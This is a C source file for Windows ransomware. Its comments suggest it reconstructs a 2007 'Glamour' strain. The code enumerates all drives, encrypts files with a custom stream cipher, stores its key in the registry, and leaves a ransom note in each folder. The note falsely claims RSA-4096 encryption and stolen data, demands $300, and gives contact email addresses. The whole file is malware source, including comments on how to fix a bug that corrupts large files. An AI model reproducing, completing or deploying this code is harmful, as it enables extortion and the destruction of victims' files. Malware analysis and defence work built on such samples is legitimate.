#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "main.h"

/* -- gooncity and you can't get in -- */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HANDLE hThread = NULL;
	myProcessHeap = GetProcessHeap();
	
#ifndef DEBUG
	SetErrorMode(SEM_NOOPENFILEERRORBOX | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
#endif

	hThread = CreateThread(NULL, 0, file_encrypt_thread, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

/* -- where the magic happens -- */
DWORD WINAPI file_encrypt_thread(LPVOID none)
{
	WCHAR tempfold[MAX_PATH];
	WCHAR tempname[MAX_PATH];
	CHAR *newstr = NULL;
	
	DWORD code = 0;
	
	SYSTEMTIME systemtime;
	
	/* -- check the date, start if we are past 2007, and july 10th -- */
#ifndef DEBUG
	GetSystemTime(&systemtime);
	if(systemtime.wYear >= 2007 && systemtime.wMonth >= 7 && systemtime.wDay >= 10)
#endif
	{
		install_reg_wincode();
		install_reg_win32();
		
		/* -- -- */
		memcpy(&code, wincode, 4);
		
#ifdef DEBUG
		printf("WinCode => %d\r\nWin32 => %d\r\n\r\n", code, win32);
		system("pause");
#endif
		
		/* -- check if the code is the magic number, quit if so -- */
		if(code != 31337)
		{
			GetTempPathW(MAX_PATH, tempfold);
			GetTempFileNameW(tempfold, NULL, 0, tempname);
			
#ifdef DEBUG
			wprintf(L"temp path => %ws\r\n\r\n", tempname);
			system("pause");
#endif
			
			vfiles = CreateFileW(tempname, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
			if(vfiles != NULL)
			{
				/* -- enumerate drives for files to encrypt -- */
				enum_drives();
#ifndef DEBUG
				Sleep(60 * 1000);
#else
				printf("\r\n\r\nDONE ENUMING FILES!\r\nBEGINNING FILE ENCRYPTION...\r\n\r\n");
				Sleep(5  * 1000);
#endif
				
				/* -- begin encryption on all the valid files on our list -- */
				do_main_file_work();
#ifndef DEBUG
				Sleep(60 * 1000);
#else
				printf("\r\nDONE ENCRYPTING FILES!\r\n\r\n");
				Sleep(5  * 1000);
#endif
				/* -- write a ransom note to the desktop -- */
				SHGetFolderPathW(0, CSIDL_DESKTOP, 0, 0, tempfold);
				lstrcatW(tempfold, L"\\read_me.txt");
				
				/*  -- convert a wide string to an ansii one -- */
				newstr = wc2mb(tempfold, -1);
#ifdef DEBUG
				printf("writing note to %s\r\n", newstr);
#endif
				
				write_readme_txt(newstr);
				
				if(newstr != NULL)
				{
					HeapFree(myProcessHeap, 0, newstr);
				}
				
				CloseHandle(vfiles);
				
				/* -- show the note to the user -- */
				ShellExecuteW(NULL, L"open", tempfold, 0, 0, SW_MAXIMIZE);
			}
		}
	}
}

/* -- get/set the "WinCode" value which is the encryption/decryption key -- */
void install_reg_wincode()
{
	DWORD uresult = -1;
	DWORD cbsize  = sizeof(DWORD);
	HKEY  hkey    = NULL;
	
	uresult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"software\\microsoft\\windows nt\\currentversion", 0, NULL, 0, KEY_QUERY_VALUE, NULL, &hkey, NULL);
	if(uresult == ERROR_SUCCESS)
	{
		if(RegQueryValueExW(hkey, L"WinCode", NULL, NULL, (BYTE*)&wincode, &cbsize) != ERROR_SUCCESS)
		{
			/* -- generate the code -- */
			for(int i = 0; i < sizeof(wincode); i++)
			{
				wincode[i] = GenRandomFillByte(0, 255);
			}
			
			uresult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"software\\microsoft\\windows nt\\currentversion", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hkey, NULL);
			if(uresult != ERROR_SUCCESS)
			{
				return;
			}
			RegSetValueExW(hkey, L"WinCode", 0, REG_DWORD, (BYTE*)&wincode, 4);
		}
		RegCloseKey(hkey);
		
		/* -- init the entropy buffer -- */
		init_buffer();
	    for(int i = 0, j = 0; j < 24; i++, j++)
	    {
		    entropy[j] ^= encode(wincode[i]);
		    if(i == 3)
		    {
			    i = 0;
		    }
	    }
	}
}

/* -- get/set the "Win32" value which is the randomly chosen e-mail -- */
void install_reg_win32()
{
	DWORD uresult = -1;
	DWORD cbsize  = sizeof(DWORD);
	HKEY  hkey    = NULL;
	
	uresult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"software\\microsoft\\windows nt\\currentversion", 0, NULL, 0, KEY_QUERY_VALUE, NULL, &hkey, NULL);
	if(uresult == ERROR_SUCCESS)
	{
		if(RegQueryValueExW(hkey, L"Win32", NULL, NULL, (BYTE*)&win32, &cbsize) != ERROR_SUCCESS)
		{
			win32 = GenRandomFillByte(1, 4);
			
			uresult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"software\\microsoft\\windows nt\\currentversion", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hkey, NULL);
			if(uresult != ERROR_SUCCESS)
			{
				return;
			}
			RegSetValueExW(hkey, L"Win32", 0, REG_DWORD, (BYTE*)&win32, 4);
		}
		RegCloseKey(hkey);
	}
}

/* -- drive enumeration -- */
void enum_drives()
{
	CHAR  driveroot[MAX_PATH];
	DWORD drivemask = GetLogicalDrives();
	DWORD drivetype = 0;
	
	for(int i = 0; i < 26; i++)
	{
		if((1 << i) & drivemask)
		{
            wnsprintfA(driveroot, MAX_PATH, "%c:", i + 'A');
            
			/*
				--
				  check the drive type, we dont wanna search
			      empty drives or CD drives, as those are readonly
			    --
			*/
            drivetype = GetDriveTypeA(driveroot);
            if(drivetype != DRIVE_NO_ROOT_DIR && drivetype != DRIVE_CDROM)
            {
#ifdef DEBUG
            	printf("\r\nSearching => %s...\r\n", driveroot);
#endif
                enum_files(driveroot);
		    }
		}
	}
}

/* -- recursive file enumeration -- */
void enum_files(char *path)
{
	HANDLE hfind = NULL;
	WIN32_FIND_DATAA fd;
	
	CHAR filename[MAX_PATH];
	CHAR foundfile[MAX_PATH];
	
	lstrcpyA(filename, path);
	lstrcatA(filename, "\\*");
	
	hfind = FindFirstFileA(filename, &fd);
	if(hfind != INVALID_HANDLE_VALUE)
	{
		while(FindNextFileA(hfind, &fd))
		{
			if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
            && lstrcmpiA(fd.cFileName, ".")
            && lstrcmpiA(fd.cFileName, ".."))
            {
                lstrcpyA(foundfile, path);
                lstrcatA(foundfile, "\\");
                lstrcatA(foundfile, fd.cFileName);
               	
#ifdef DEBUG
				printf("DIR => %s\r\n", foundfile);
#endif
            	enum_files(foundfile);
			}
			else if(lstrcmpiA(fd.cFileName, ".."))
			{
				/* -- we do NOT wanna encrypt notes -- */
				if(lstrcmpiA(fd.cFileName, "read_me.txt"))
				{
					wnsprintfA(foundfile, MAX_PATH, "%s\\%s", path, fd.cFileName);
					check_extension(foundfile);
				}
			}
		}
		FindClose(hfind);
	}
}

void check_extension(char *filename)
{
	DWORD wb;
	char *i;
	
	for(i = &filename[lstrlenA(filename)]; *i != '.'; --i)
	{
		if(i == filename)
		{
			return;
		}
	}
	
	for(int j = 0; j < (sizeof(extensions) / sizeof(extensions[0])); j++)
	{
		if(!lstrcmpi(i, extensions[j]))
		{
#ifdef DEBUG
			printf("VALID FILE => %s\r\n", filename);
#endif
			WriteFile(vfiles, filename, lstrlenA(filename) + 1, &wb, NULL);
			break;
		}
	}
}

/* -- valid file enumeration function -- */
void do_main_file_work()
{
	HANDLE hfilemapping = NULL;
	DWORD  filesize;
	DWORD  fileattribs;
	CHAR  *mapview  = NULL;
	CHAR  *filename = NULL;
	
	filesize = GetFileSize(vfiles, NULL);
	hfilemapping = CreateFileMappingW(vfiles, 0, PAGE_READONLY, 0, 0, 0);
	
	mapview = (CHAR*)MapViewOfFile(hfilemapping, FILE_MAP_READ, 0, 0, 0);
	
	/* -- thanks [REDACTED] -- */
	filename = mapview;
	for(DWORD i = 0; i < (filesize - 1); i++)
	{
		if(mapview[i] == '\0')
		{
			fileattribs = GetFileAttributesA(filename);
            SetFileAttributesA(filename, FILE_ATTRIBUTE_NORMAL);
            
#ifdef DEBUG
			printf("\r\nENCRYPTING => %s\r\n...", filename);
#endif
			
			/* -- do the actual file encrypt -- */
			encrypt_file(filename);
            
			SetFileAttributesA(filename, fileattribs);
            filename += lstrlenA(filename) + 1;
			
#ifdef DEBUG
			printf("DONE!\r\n\r\n");
#endif
		}
	}
	UnmapViewOfFile(mapview);
	CloseHandle(hfilemapping);
}

/* -- the main encryption function -- */
void encrypt_file(char *filename)
{
	CHAR   fileheader[7];
	BYTE   filebuffer[65536];
	
	HANDLE filehandle = INVALID_HANDLE_VALUE;
	
	WCHAR *newname = NULL;
	
	FILETIME ftCreate;
	FILETIME ftAccess;
	FILETIME ftWrite;
	
	DWORD filesize = 0;
	DWORD rb = 0;
	DWORD pointerresult = 0;
	
	newname = mb2wc(filename, -1);
	
	filehandle = CreateFileW(newname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(newname != NULL)
	{
		HeapFree(myProcessHeap, 0, newname);
	}
	
	if(filehandle != INVALID_HANDLE_VALUE)
	{		
		GetFileTime(filehandle, &ftCreate, &ftAccess, &ftWrite);
		filesize = GetFileSize(filehandle, NULL);
		
		/* -- read the first 7 bytes of a file -- */
		if(ReadFile(filehandle, fileheader, 7, &rb, NULL))
		{
			/* -- check if its already encrypted -- */
			if(rb >= 7 &&
			fileheader[0] != 'G' &&
			fileheader[1] != 'L' &&
			fileheader[2] != 'A' &&
			fileheader[3] != 'M' &&
			fileheader[4] != 'O' &&
			fileheader[5] != 'U' &&
			fileheader[6] != 'R')
			{
				/* -- reset back and write our encrypted header -- */
				SetFilePointer(filehandle, 0, 0, FILE_BEGIN);
				if(WriteFile(filehandle, "GLAMOUR", 7, &rb, NULL))
				{
					if(rb != 0)
					{
						/* -- init the crypto -- */
						init_buffer();
						while(rb != 0 && filesize != (pointerresult + rb) && pointerresult <= 10000000)
						{
							/* -- read the data into the buffer -- */
							if(!ReadFile(filehandle, filebuffer, 65536, &rb, NULL))
							{
								break;
							}
							
							if(rb == 0)
							{
								break;
							}
							
							/* -- encrypt the read data -- */
							if(rb > 0)
							{
							    for(int i = 0; i < rb; i++)
							    {
								    filebuffer[i] = encode(filebuffer[i]);
							    }
							}
							
							/* -- move back, and write the new data ontop -- */
							pointerresult = SetFilePointer(filehandle, -rb, 0, FILE_CURRENT);
							if(!WriteFile(filehandle, filebuffer, rb, &rb, NULL))
							{
								break;
							}
						}
						
						/* -- BUG: we dont reset the file pointer to EOF, corrupting large files -- */
						/* -- PoC code to correct the bug -- */
						//SetFilePointer(filehandle, 0, 0, FILE_END);
						
						/* -- append the read header bytes to the file -- */
						WriteFile(filehandle, fileheader, 7, &rb, NULL);
						
						/* -- reset the file write/access time -- */
						SetFileTime(filehandle, &ftCreate, &ftAccess, &ftWrite);
						
						CloseHandle(filehandle);
						
						/* -- write our note -- */
						write_readme_txt(filename);
					}
				}
			}
#ifdef DEBUG
			else
			{
				printf("SKIPPING! => ");
			}
#endif
		}
	}
#ifdef DEBUG
	else
	{
		printf("FAILURE! => ");
	}
#endif
}

/* -- write a note to the directory of a FULL path of a file -- */
void write_readme_txt(char *fullpath)
{
	HANDLE hnote = INVALID_HANDLE_VALUE;
	
	CHAR notepath[1024];
	CHAR notebuff[1024];
	CHAR emailbuff[256];
	
	WCHAR *newname = NULL;
	
	char *i;
	
	DWORD code = 0;
	DWORD wb   = 0;
	
	lstrcpyA(notepath, fullpath);
	
	for(i = &notepath[lstrlenA(notepath)]; *i != '\\'; --i);
	*i = '\0';
	
	lstrcatA(notepath, "\\read_me.txt");
	
	switch(win32)
	{
		case 1:
		{
      		wnsprintfA(emailbuff, 256, "glamourpalace@gmail.com");
      		break;
  		}
  		
    	case 2:
      	{
			wnsprintfA(emailbuff, 256, "oxyglamour@gmail.com");
      		break;
      	}
      	
    	case 3:
      	{
			wnsprintfA(emailbuff, 256, "tristanniglam@gmail.com");
      		break;
      	}
      	
    	case 4:
      	{
			wnsprintfA(emailbuff, 256, "kiloglamour@gmail.com");
      		break;
      	}
	}
	
	newname = mb2wc(notepath, -1);
	
	hnote = CreateFileW(newname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if(newname != NULL)
	{
		HeapFree(myProcessHeap, 0, newname);
	}
	
	if(hnote != INVALID_HANDLE_VALUE)
	{
		memcpy(&code, wincode, 4);
		
		wnsprintfA(notebuff, 1024,
				"Hello,    your   files   are   encrypted   with   RSA-4096   algorithm\n"
			    "(http://en.wikipedia.org/wiki/RSA).\n"
			    "\n"
			    "You  will  need  at least few years to decrypt these files without our\n"
			    "software.  All  your  private  information  for  last  3  months  were\n"
			    "collected and sent to us.\n"
			    "\n"
			    "To decrypt your files you need to buy our software. The price is $300.\n"
			    "\n"
			    "To  buy  our software please contact us at: %s and provide us\n"
			    "your  personal code %d. After successful purchase we will send\n"
			    "your  decrypting  tool,  and  your private information will be deleted\n"
			    "from our system.\n"
			    "\n"
			    "If  you  will not contact us until 07/15/2007 your private information\n"
			    "will be shared and you will lost all your data.\n"
			    "\n"
			    "\t\t\t\tGlamorous team", emailbuff, code);
		WriteFile(hnote, notebuff, lstrlenA(notebuff), &wb, NULL);
		CloseHandle(hnote);
	}
}

/* -- utils -- */

/* -- converts an ansii string to a wide one -- */
WCHAR *mb2wc(char *str, int len)
{
	WCHAR *newstr = NULL;
	
	if(str != NULL)
	{
		if(len == -1)
		{
			len = lstrlenA(str);
		}
		
		newstr = (WCHAR*)HeapAlloc(myProcessHeap, HEAP_ZERO_MEMORY, len * 2 + 2);
		if(newstr != NULL)
		{
			MultiByteToWideChar(CP_OEMCP, 0, str, len, newstr, len);
			//newstr[2 * len + 2] = '\0'; /* -- crashes for some reason -- */
		}
		return newstr;
	}
	else
	{
		return NULL;
	}
}

/* -- converts a wide string to an ansii one -- */
CHAR *wc2mb(WCHAR *str, int len)
{
	CHAR *newstr = NULL;
	
	if(str != NULL)
	{
		if(len == -1)
		{
			len = lstrlenW(str);
		}
		
		int len2 = len + 1;
		
		newstr = (CHAR*)HeapAlloc(myProcessHeap, HEAP_ZERO_MEMORY, len + 1);
		if(newstr != NULL)
		{
			WideCharToMultiByte(CP_OEMCP, 0, str, len2 - 1, newstr, len2 - 1, 0, 0);
			newstr[len2 - 1] = '\0';
		}
		return newstr;
	}
	else
	{
		return NULL;
	}
}

/* -- generate a random number (or byte) based on GetTickCount() -- */
int GenRandomFillByte(int ival, int uival)
{
	if(!tickCount)
	{
		tickCount = GetTickCount();
	}
	
	tickCount =  214013 * tickCount + 2531011;
	return ival + tickCount % (uival - ival + 1);
}

/* -- crypto -- */

void init_buffer() 
{
	ga = 0;
	gb = 0;

	for(int i = 0; i < sizeof(key); i++)
	{
		key[i] = i + 24;
	}

	for(int i = 0; i < sizeof(key); i++) 
	{
		BYTE a = key[i];
		ga += (a + entropy[i % 24]);
		
		int  b = (int)ga;
		BYTE c = a;
		
		a = key[b];
		
		key[i] = a;
		key[b] = gb = c;
	}
}

/* -- this should be closer to how it functioned in the ransomware -- */
BYTE encode(BYTE x)
{
    BYTE a = x ^ ga;
    process_byte(x);
    return a;
}

void process_byte(BYTE x)
{
    BYTE b = key[x];
    BYTE c = ga + b;

    int  d = (int)c;

    BYTE e = key[d];

    key[x] = e;
    key[d] = b;

    c = b + key[x];

    gb = b;
    ga = c;
}

/*BYTE encode(BYTE x)
{
	BYTE a = ga ^ x;
	BYTE b = key[x];
	BYTE c = ga + b;
	
	int  d = (int)c;
	
	BYTE e = key[d];
	
	key[x] = e;
	key[d] = b;
	
	c = b + key[x];
	
	gb = b;
	ga = c;
	return a;
}*/
